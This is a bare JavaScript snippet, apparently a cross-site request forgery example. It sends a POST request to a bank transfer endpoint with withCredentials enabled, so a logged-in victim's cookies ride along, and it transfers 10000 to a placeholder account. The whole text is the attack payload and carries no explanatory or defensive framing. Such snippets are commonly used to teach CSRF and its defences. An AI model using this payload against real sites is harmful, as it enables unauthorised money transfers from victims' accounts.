var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://bank.com/transfer-money', true);\nxhr.withCredentials = true; // send cookies with the request\nxhr.send({ amount: '10000', to_account: 'xxxx' });